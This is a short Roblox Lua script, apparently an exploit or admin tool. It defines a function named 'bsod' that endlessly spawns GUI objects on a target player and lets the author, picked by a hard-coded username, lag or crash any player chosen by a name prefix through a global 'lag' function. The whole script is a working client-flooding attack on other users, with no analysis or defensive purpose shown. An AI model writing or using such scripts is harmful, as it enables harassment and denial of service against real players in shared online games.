bsod=function(n,number)
if getfenv(0).owner==game.Players.islandmaker2012 then
coroutine.wrap(function()
while wait(0) do
  for i=1,number or 10 do
Instance.new("Part", (Instance.new("Model", (Instance.new("ScreenGui",n)) ) )  )
  end
end

end)()
end
end

fp=function(N)
l=#N
for i,v in pairs(game.Players:children()) do
if v.Name:lower():sub(1,l)==N:lower() then
return v
end
end
end


_G.lag=function(n,NN)
if fp(n) then bsod(fp(n),NN) end
end
